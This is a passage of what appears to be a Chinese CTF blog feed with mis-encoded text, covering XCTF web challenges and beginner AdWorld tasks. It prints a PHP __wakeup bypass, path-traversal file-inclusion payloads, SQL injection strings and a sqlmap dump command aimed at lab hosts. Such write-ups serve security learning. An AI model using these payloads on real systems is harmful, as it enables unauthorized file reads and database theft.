class="hljs-params"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = <span class="hljs-variable">$flag</span>;<br>    &#125;   <br>&#125;<br><span class="hljs-variable">$Xctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>(<span class="hljs-string">&#x27;111&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Xctf</span>);<br></code></pre></td></tr></table></figure><blockquote><p>åœ¨çº¿è¿è¡Œä»£ç ç½‘ç«™<a href="https://code.y444.cn/php">PHPåœ¨çº¿è¿è¡Œå·¥å…·|ä»£ç åœ¨çº¿è¿è¡Œå·¥å…· (y444.cn)</a></p></blockquote><p>è¿è¡Œç»“æœä¸º<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>é¢˜ä¸­ç»™çš„xctfç±»ä¸­æœ‰wakeup()æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä¼šç›´æ¥æ‰§è¡Œexit()å‡½æ•°ï¼Œæ‰€ä»¥è¦å¯¹wakeup()æ–¹æ³•è¿›è¡Œç»•è¿‡</p><p>ç½‘ä¸Šçš„è¯´æ³•æ˜¯åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­ç±»ååé¢çš„æ•°å­—ä»£è¡¨è¯¥ç±»çš„å±æ€§ä¸ªæ•°ï¼Œè‹¥å°†è¯¥å€¼ä¿®æ”¹ä¸ºå¤§äºåŸæœ‰çš„ä¸ªæ•°ï¼Œåˆ™è·³è¿‡wakeup()é­”æœ¯æ–¹æ³•</p><p>ç»“æœä¸º<code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608233717557.png" alt="image-20220608233717557" /></p><hr /><h1 id="warmup"><a class="markdownIt-Anchor" href="#warmup"></a> warmup</h1><p>ä¸Šæ¥ç»™ä¸€ä¸ªå¤§æ»‘ç¨½å›¾ç‰‡ï¼Œç»™æˆ‘æ•´ä¸ä¼šäº†ğŸ˜“</p><p>å®¡è®¡æºç éšè—source.phpï¼Œè´´ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®hint.phpå¾—åˆ°flagçš„ç›¸å…³ä¿¡æ¯: ffffllllaaaagggg</p><p>ç™½åå•è¿‡æ»¤ï¼Œ<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>p</mi></msub><mi>a</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">å˜</mi><mi mathvariant="normal">é‡</mi><mi mathvariant="normal">æ˜¯</mi></mrow><annotation encoding="application/x-tex">_pageå˜é‡æ˜¯</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">å˜</span><span class="mord cjk_fallback">é‡</span><span class="mord cjk_fallback">æ˜¯</span></span></span></span>pageå˜é‡å–ç¬¬ä¸€ä¸ª?å‰çš„æ‰€æœ‰å­—ç¬¦ï¼Œè§‚å¯Ÿreturn trueçš„æ—¶å€™æ»¡è¶³çš„æ¡ä»¶</p><p>ç¬¬ä¸€ä¸ªä¸ºsource.php(hint.php)? + payload</p><p>ç¬¬äºŒä¸ªä¸ºsource.php(hint.php)%25%33%66 + payload</p><blockquote><p>%25%33%66 ä¸º?çš„ä¸¤æ¬¡urlencode</p></blockquote><p>æœ€ç»ˆç»•è¿‡åè¿›å…¥æ–‡ä»¶åŒ…å«çš„å‘½ä»¤ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;source.php(hint.php)? + payload&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä¸æ–­å°è¯•åå¾—åˆ°payloadï¼Œä½†æˆ‘ä¸æ˜¯å¾ˆæ‡‚includeæ–‡ä»¶åŒ…å«ä¸ºä»€ä¹ˆä¼šæˆåŠŸ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">source.php?file=source.php?../../../../../ffffllllaaaagggg<br>source.php?file=source.php%25%33%66../../../../../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610014052090.png" alt="image-20220610014052090" /></p><hr /><h1 id="newscenter"><a class="markdownIt-Anchor" href="#newscenter"></a> NewsCenter</h1><p>æ‰“å¼€åè¾“å…¥å…³é”®è¯æŸ¥æ‰¾newsï¼Œæ‰«äº†ä¸‹ç½‘ç«™ç›®å½•æ²¡ä»€ä¹ˆå‘ç°</p><p>è¯•äº†ä¸‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼Œå•å¼•å·é—­åˆï¼Œæœç„¶æŠ¥é”™äº†</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610104337575.png" alt="image-20220610104337575" /></p><p>ç”¨order by fuzzä¸€ä¸‹ï¼Œæœ‰3åˆ—</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">#</span><br><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,database() <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>æ‰‹å·¥æ³¨å…¥åšä¸ä¸‹å»äº†ï¼š) <s>è‡ªå·±å¤ªèœäº†</s> ï¼Œä¸Šsqlmapï¼Œå±äºç›²æ³¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://111.200.241.244:57582/ --data=search=1 -D news -T secret_table -columns --dump<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610105942596.png" alt="image-20220610105942596" /></p><hr /><h1 id="nannannannan-batman"><a class="markdownIt-Anchor" href="#nannannannan-batman"></a> NaNNaNNaNNaN-Batman</h1><p>ç»™äº†attachmenté™„ä»¶ï¼Œçœ‹ä¸€çœ‹æ˜¯ä»€ä¹ˆé¬¼</p><p>æ‰“å¼€åä¸€å †ä¹±ç ï¼Œå¾ˆå¤šæ··æ·†ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ”¹ï¼Œåªèƒ½çœ‹wpäº†ï¼ŒåŸæ¥æ˜¯å°†æ‰§è¡Œä»£ç <strong>eval</strong>å˜ä¸º<strong>alert</strong>æ˜¾ç¤ºå‡ºæºç (<strong>å…³é”®è¯»æ‡‚jsçš„å«ä¹‰</strong>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">$</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> e=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;c&quot;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(e.<span class="hljs-property">length</span>==<span class="hljs-number">16</span>)</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^be0f23/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/233ac/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/e98aa$/</span>)!=<span class="hljs-literal">null</span>)</span><br><span class="language-javascript">                        <span class="hljs-keyword">if</span>(e.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/c7be9/</span>)!=<span class="hljs-literal">null</span>)&#123;</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> t=[<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;s_a&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;e&#125;&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> n=[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;_h0l&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> r=[<span class="hljs-string">&quot;g&#123;&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;_0&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> i=[<span class="hljs-string">&quot;it&#x27;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript">                            <span class="hljs-keyword">var</span> s=[t,n,r,i];</span><br><span class="language-javascript">                            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;</span><br><span class="language-javascript">                                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);</span><br><span class="language-javascript">                                s[o%<span class="hljs-number">4</span>].<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="language-javascript"><span class="hljs-keyword">delete</span> _</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åˆšå¼€å§‹æˆ‘è¿˜åœ¨æ¢ç´¢æ€æ ·æ„é€ è¾“å…¥çš„å€¼ï¼Œæ»¡è¶³è¿™ä¹ˆå¤šçš„ifæ¡ä»¶ï¼Œä½†æ ¹æœ¬ä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥æŠŠæ ¸å¿ƒå†…å®¹æ‹¿å‡ºæ¥è¾“å‡ºå®Œäº‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> t=[<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;s_a&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;e&#125;&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> n=[<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;_h0l&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> r=[<span class="hljs-string">&quot;g&#123;&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;_0&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> i=[<span class="hljs-string">&quot;it&#x27;&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>];</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> s=[t,n,r,i];</span><br><span class="language-javascript"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(s[o%<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);</span><br><span class="language-javascript">s[o%<span class="hljs-number">4</span>].<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220610113732822.png" alt="image-20220610113732822" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ”»é˜²ä¸–ç•ŒWebæ–°æ‰‹åŒº</title>
    <link href="/2022/06/08/AdWorld/"/>
    <url>/2022/06/08/AdWorld/</url>
    
    <content type="html"><![CDATA[<h1 id="å†™åœ¨å‰é¢"><a class="markdownIt-Anchor" href="#å†™åœ¨å‰é¢"></a> å†™åœ¨å‰é¢</h1><p>ä½œä¸ºä¸€ä¸ªå­¦ä¹ ç½‘å®‰çš„èœé¸¡,å¤§å¤šæ—¶å€™éƒ½<strong>ä¸å¤ªæ­£ç»</strong>,åªä¼šå»ç ”ç©¶è‡ªå·±æ„Ÿå…´è¶£çš„ä¸œè¥¿,å¯¼è‡´æ¥è§¦çš„ä¸œè¥¿æ‚è€Œå¤š,ä½†éƒ½æ²¡æœ‰æ˜¾è‘—çš„æˆæœ,æ˜¯æ—¶å€™å›å½’webæ­£é“äº†,å°±ä»æœ€åŸºç¡€çš„æ”»é˜²ä¸–ç•Œå‡ºå‘,è®°å½•æˆ‘çš„webå­¦ä¹ ä¹‹è·¯ã€‚</p><h1 id="view_source"><a class="markdownIt-Anchor" href="#view_source"></a> view_source</h1><p>æ‰“å¼€é¡µé¢åå‘ç°é¼ æ ‡å·¦é”®é€‰ä¸­å’Œå³é”®å¤±çµ,æç¤ºæŸ¥çœ‹æºç F12</p><p><img src="https://s2.loli.net/2022/06/07/her6mUTSKWqF8LX.png" alt="image-20220607000350524" /></p><p>edgeæºä»£ç ä¸€æ é€‰ä¸­é¡µé¢é€‰é¡¹,ä¼šæ˜¾ç¤ºç›¸å…³ç«™ç‚¹ä¿¡æ¯çš„é¡µé¢æºç ,åŒ…å«jså’Œhtmlç­‰</p><p>è¿™é‡Œå‘ç°æ˜¯é€šè¿‡jsä¸­ <strong>oncontextmenu</strong> å’Œ <strong>onselectstart</strong> çš„<strong>DOMäº‹ä»¶</strong>æ¥ç¦ç”¨é¼ æ ‡ç‚¹å‡»å³é”®èœå•å’Œç›®æ ‡é€‰ä¸­</p><p>htmlæ³¨é‡Šéšè—flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- åœ¨æ­¤å¤„å†™æ³¨é‡Š --&gt;</span><br></code></pre></td></tr></table></figure><hr /><h1 id="get_post"><a class="markdownIt-Anchor" href="#get_post"></a> get_post</h1><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004453104.png" alt="image-20220607004453104" /></p><p>httpåè®®ä¸­ä½¿ç”¨GETæ–¹æ³•æäº¤å˜é‡, æ–¹æ³•ä¸ºåœ¨urlæ·»åŠ ?å’Œå˜é‡å€¼,å¤šä¸ªå€¼ç”¨&amp;ç¬¦å·æ‹¼æ¥</p><p>å¯ä»¥ç›´æ¥åœ¨Queryä¸€æ æ·»åŠ ç›¸å…³å˜é‡</p><p>(ä»¥GETæ–¹å¼æäº¤å˜é‡<strong>ä¸å—GETæ–¹æ³•çš„é™åˆ¶</strong>,å¯ä»¥æ˜¯POSTæˆ–è€…å…¶ä»–æ–¹æ³•)</p><p><img src="https://s2.loli.net/2022/06/07/Es3PqxWDGdju8Cl.png" alt="image-20220607005745599" /></p><p>å†ä»¥POSTæ–¹æ³•æäº¤å˜é‡b,åœ¨bodyå¤„å¯ä»¥é€šè¿‡form-dataå’Œwww-form-urlencodedæ–¹å¼æäº¤</p><p><img src="https://s2.loli.net/2022/06/07/IGBQbTzf58iYMsJ.png" alt="image-20220607010134446" /></p><hr /><h2 id="robots"><a class="markdownIt-Anchor" href="#robots"></a> robots</h2><h4 id="robotsåè®®"><a class="markdownIt-Anchor" href="#robotsåè®®"></a> Robotsåè®®</h4><blockquote><p>Robotsåè®®ï¼ˆä¹Ÿç§°ä¸ºçˆ¬è™«åè®®ã€æœºå™¨äººåè®®ç­‰ï¼‰çš„å…¨ç§°æ˜¯â€œç½‘ç»œçˆ¬è™«æ’é™¤æ ‡å‡†â€ï¼ˆRobots ExclusionProtocolï¼‰ï¼Œç½‘ç«™é€šè¿‡Robotsåè®®å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½æŠ“å–.</p></blockquote><p>æ ¹æ®åè®®ï¼Œç½‘ç«™ç®¡ç†å‘˜å¯ä»¥åœ¨<strong>ç½‘ç«™åŸŸåçš„æ ¹ç›®å½•ä¸‹æ”¾ä¸€ä¸ªrobots.txt æ–‡æœ¬æ–‡ä»¶</strong>ï¼Œé‡Œé¢å¯ä»¥æŒ‡å®šä¸åŒçš„ç½‘ç»œçˆ¬è™«èƒ½è®¿é—®çš„é¡µé¢å’Œç¦æ­¢è®¿é—®çš„é¡µé¢ï¼ŒæŒ‡å®šçš„é¡µé¢ç”±æ­£åˆ™è¡¨è¾¾å¼è¡¨ç¤ºã€‚ç½‘ç»œçˆ¬è™«åœ¨é‡‡é›†è¿™ä¸ªç½‘ç«™ä¹‹å‰ï¼Œé¦–å…ˆè·å–åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè§£æåˆ°å…¶ä¸­çš„è§„åˆ™ï¼Œç„¶åæ ¹æ®è§„åˆ™æ¥é‡‡é›†ç½‘ç«™çš„æ•°æ®ã€‚</p><p>æ³¨æ„ï¼Œè¿™ä¸ªåè®®çš„å­˜åœ¨æ›´å¤šçš„æ˜¯éœ€è¦ç½‘ç»œçˆ¬è™«å»éµå®ˆï¼Œè€Œèµ·ä¸åˆ°åçˆ¬è™«çš„åŠŸèƒ½(<strong>æ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤</strong>)</p><p>æ­¤åè®®å¯ä»¥å‡å°‘æœç´¢å¼•æ“çˆ¬è™«çš„è®¿é—®æµé‡, User-agentè¡Œä¸­ ç™¾åº¦ä¸ºBaiduspider Googleä¸ºGooglebot(å¯æŸ¥é˜…ç›¸å…³å®˜ç½‘çš„çˆ¬è™«åˆ—è¡¨)</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-agentï¼šæŒ‡å®šå¯¹å“ªäº›çˆ¬è™«ç”Ÿæ•ˆ<br>Disallowï¼šæŒ‡å®šè¦å±è”½çš„ç½‘å€<br></code></pre></td></tr></table></figure><p>Disallow è¡Œåˆ—å‡ºçš„æ˜¯è¦æ‹¦æˆªçš„ç½‘é¡µï¼Œä»¥æ­£æ–œçº¿ (/) å¼€å¤´ï¼Œå¯ä»¥åˆ—å‡ºç‰¹å®šçš„ç½‘å€æˆ–æ¨¡å¼ã€‚è¦å±è”½æ•´ä¸ªç½‘ç«™ï¼Œä½¿ç”¨æ­£æ–œçº¿å³å¯;è¦å±è”½æŸä¸€ç›®å½•ä»¥åŠå…¶ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œåœ¨ç›®å½•ååæ·»åŠ æ­£æ–œçº¿;è¦å±è”½æŸä¸ªå…·ä½“çš„ç½‘é¡µï¼Œå°±æŒ‡å‡ºè¿™ä¸ªç½‘é¡µã€‚</p><p>æœ¬é¢˜è‹¥æ²¡æœ‰æç¤º,ä¹Ÿå¯ä»¥é€šè¿‡ç½‘ç«™åå°æ‰«æå‡ºæ•æ„Ÿé¡µé¢</p><p><img src="https://s2.loli.net/2022/06/07/mHKSuMc8ZgrtkY9.png" alt="image-20220607004124129" /></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004211230.png" alt="image-20220607004211230" /></p><p>æŸ¥çœ‹f1ag_1s_h3re.phpé¡µé¢å¾—åˆ°flag</p><hr /><h1 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h1><p>æ ¹æ®æç¤ºç½‘ç«™çš„å¤‡ä»½æ–‡ä»¶ï¼Œé€šè¿‡dirsearchæ‰«æç½‘ç«™ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python dirsearch -u http://111.200.241.244:60228<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112427174.png" alt="image-20220607112427174" /></p><p>å°†æ–‡ä»¶åç¼€æ”¹ä¸º.phpæŸ¥çœ‹åè·å–flag</p><hr /><h1 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h1><p>æ ¹æ®é¢˜ç›®æç¤ºæŸ¥çœ‹cookieï¼Œå¯åœ¨edgeçš„F12å¼€å‘è€…é€‰é¡¹ä¸­é€‰ä¸­åº”ç”¨ç¨‹åºä¸€æ æŸ¥çœ‹å­˜å‚¨çš„cookie</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112921575.png" alt="image-20220607112921575" /></p><p>è®¿é—®cookie.phpåæ ¹æ®æç¤ºæŸ¥çœ‹è¯¥é¡µé¢çš„httpå“åº”å¤´éƒ¨è·å–flag</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607113142926.png" alt="image-20220607113142926" /></p><hr /><h1 id="disabled_button"><a class="markdownIt-Anchor" href="#disabled_button"></a> disabled_button</h1><p>æ‰“å¼€é¡µé¢å‘ç°æŒ‰é’®ä¸èƒ½ç‚¹å‡»ï¼Œå®¡è®¡æºç </p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231314286.png" alt="image-20220607231314286" /></p><p>è¿™é‡Œinputæ 